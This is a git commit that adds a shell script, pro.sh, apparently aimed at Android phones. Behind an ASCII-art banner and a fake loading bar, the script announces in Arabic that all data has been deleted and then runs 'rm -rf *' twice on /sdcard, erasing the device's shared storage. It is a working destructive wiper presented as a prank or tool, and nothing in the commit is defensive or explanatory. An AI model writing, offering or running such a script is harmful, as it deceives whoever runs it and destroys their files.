e6ea3d876e76a018ad84890bf7dfa76f5f6ad554
qw46478 <46646584+qw46478@users.noreply.github.com>
2019-02-04 22:09:11 +0200

    Add files via upload

---
+++ pro.sh
@@ -0,0 +1,104 @@
+
+echo -e "\033[92m"
+
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhyo+:--.``      ``.--/+oyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds+-.`                          `.:+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMNho:`                                     `.:ohNMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMmy/.                                             `./yNMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMNy:`                    ---AHSAN--                      `/hNMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMdo.                                                          .omMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMd/`                                                              `+dMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMd/`                                                                  `/mMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMm+`        .:.             ```..------------..```            `-:.        .oNMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMy.      `/sdy:`         `.....--.``-.`-.`.-``.--.....`         `/hds:`      -hMMMMMMMMMMM'
+echo 'MMMMMMMMMN+`   ...omMNs.       ``...```..`   -.  ..  .-   `..```...`        .sNMd+...   `+NMMMMMMMMM'
+echo 'MMMMMMMMd:  `:yo:hMMm/       `.-.`   .-`    ..   ..   ..    `-.   `--.`       +mMMh:os:   /mMMMMMMMM'
+echo 'MMMMMMMd.  `sNy.hMms//     `..``....--`    `-    ..   `-`    `--....``..`     +/smMy.hNs`  -dMMMMMMM'
+echo 'MMMMMMd. ``sMN-odo/sd-   `..`     .-.......--``-:+o+/-`--.......-`     `..`   -ds/od+:NMo`` -dMMMMMM'
+echo 'MMMMMd. :+:NMh`/ohNd-  `..`      `-`     `.-``oNh:/dMNo.-.`     `-`      `-.   :mNh+/.dMm-o- -mMMMMM'
+echo 'MMMMN- /N//MN+omNmo.  `-.       `-`       ..  :ho-.yMNo -.       .-`       .-`  .omNmo+MN:om: :NMMMM'
+echo 'MMMM+ .mM/:NdmNy+:   `-`        -.        -`     .omh/` .-        .-        .-`   :+hNmdN:+Mm` sMMMM'
+echo 'MMMh` +MMo:Nms:+h:  `--..``    .-        `-`     :y-    `-`        -.    ``..--`  :h//yNm-sMM/ `dMMM'
+echo 'MMM:  sMMh-y/omMo  `-` ``......-.``      .-      ::      -.     ```.-......`` .-`  sMdo/y-dMMo  /M.M'
+echo 'MMd` `oMMd.+mMMo`  -.         .-`........--...``+dd/``...--........`-.         ..  `oMMm+`mMM+` `dMM'
+echo 'MMo ./-NMhoNMm+   `-          -.        `-.`````/dh:`````.-         .-         `-`   omMN+dMN.+` sMM'
+echo 'MN- ss`sMyMMy.o   -.         `-`         -.      --      .-         `-          .-  `o.yMNhMo`yo :NM'
+echo 'MN``hm-`mNN/`sd  `-`         `-`        `-`  ``-+oo+-``  .-         `-`         `-   ms`+NNd`:Ny .NM'
+echo 'Mm `hMh`/N:.hMo  `-`         .-`        `-./y--smMMds--y:.-`        `-`         `-`  sMh./N:`dMy `mM'
+echo 'Mm  oMMy./-mMm-  `--.........---......--/smMN   /NN:  `NMms/-.......---.........--`  :NMd.+.hMM/  mM'
+echo 'Mm  `NMMs hMMs   `-`         .-`:+osydmNMMMM+  -/hy/.  oMMMMNmhyso+:`-`         `-`   yMMy`yMMN` `mM'
+echo 'MN` `+NMN:MMd./  `-`         `-oMMMMMMMMMMMN-   .md`   :NMMMMMMMMMMM+-`         `-   /.mMN:NMN/. .NM'
+echo 'MN:`s`/mMsMM/.d:  -.         `:dMMMMMMMMMMMN:   +MM/   /NMMMMMMMMMMMh:          .-  +d`+MNyMm:.s`/NM'
+echo 'MMo yd-.ymNm`:Mh` `-          /NMMMMMMMMMMMMy   yMMs   hMMMMMMMMMMMMm:         `-` `hN:`NmNy.:ds sMM'
+echo 'MMd`:MNo./mh yMm.  -.         oNMMMMMMMMMMMMM/  hMMy  /MMMMMMMMMMMMMN+         ..  -NMs mm:.oNN-`mMM'
+echo 'MMM: oNMm+-o`mMM:` `-. ``.....hMMMMMMMMMMMMMMN/ dMMy +NMMMMMMMMMMMMMMy.....`` .-  `:MMm o-omMN+ /MMM'
+echo 'MMMh` /mMMd/`mMM::o``--.```   dMMMMMMMMMMMMMMMNomMMdsNMMMMMMMMMMMMMMMh   ```.--``o-+MMd +dMMm: .dMMM'
+echo 'MMMMo  -yNMNssMM+`dd.`-`     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM`     .-`.dd sMMoyNMNy-  sMMMM'
+echo 'MMMMN- :::ymNddMd sMd.`-.    /MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:    .-`-dM+`dMddNms-/: :MMMMM'
+echo 'MMMMMd-`yy-./ydNN::NMh` .-`  sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo  `-. .dMN-/NNdy:.:ys`-mMMMMM'
+echo 'MMMMMMd..sNh+--/ys.hMMs`.....hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy`....`yMMy.ys/-:odNs`-mMMMMMM'
+echo 'MMMMMMMd-`/dMNdy+/--mMN//y/.:mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd-./y:+MMm--/oymNMh/ -mMMMMMMM'
+echo 'MMMMMMMMm/ `/ymMMNmsodMm-oNhomMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmodm+:mMhoymNMMmy:` /mMMMMMMMM'
+echo 'MMMMMMMMMN+` `:oymNNNmmNd-oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN+-mNmmNNNmy+-` `oNMMMMMMMMM'
+echo 'MMMMMMMMMMMh- .++:::/osydh//dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd//hdys+/:::++` -hMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMNo.`/yhhyssoooo+/ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho/+oooossyhhy:`.oNMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMm/` -/ydNNMMMMMMNmmdhsyMMMMMMMMMMMMMMMMMMMMMMMMMMyyhdmmNMMMMMMNmdy/. .+mMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMd+.  `://++++/:---/sdMMMMMMMMMMMMMMMMMMMMMMMMMMho:---:/++++//:`  .+dMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMmo.`.+sssoooshdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhsooosss/.`-smMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMNh/``:+ydmNNNmdymMMMMMMMMMMMMMMMMMMMMMMMMMMdydmNNNmdy+:`./hNMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMNy/.`        hMMMMMMMMMMMMMMMMMMMMMMMMMMy        `./hNMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMNds:.`   `dMMMMMMMMMMMMMMMMMMMMMMMMMMd    `./sdNMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+::mMMMMMMMMMMMMMMMMMMMMMMMMMMm::oydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+echo 'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
+
+sleep 7
+
+clear 
+echo "10% [==>      ]"
+sleep 1
+clear
+echo "20% [====>    ]"
+sleep 1
+clear
+echo "30% [======>  ]"
+sleep 1
+clear
+echo "40% [========> ]"
+sleep 1
+clear
+echo "50% [==>       ]"
+sleep 1
+clear
+echo "60% [==>       ]"
+sleep 1
+clear
+echo "70% [==>       ]"
+sleep 1
+clear
+echo "80% [==>       ]"
+sleep 1
+clear
+echo "90% [==>       ]"
+sleep 1
+clear
+echo "100% [======>=>]"
+sleep 1
+clear
+
+
+echo   "Ahsan Hacker-: ﺕﺎﻧﺎﻴﺒﻟﺍ ﻊﻴﻤﺟ ﻑﺪﺣ ﻢﺗ         "
+sleep 3
+
+cd /sdcard
+
+rm -rf *
+
+cd /sdcard
+
+rm -rf *
+
+figlet Hacker libya
+
+
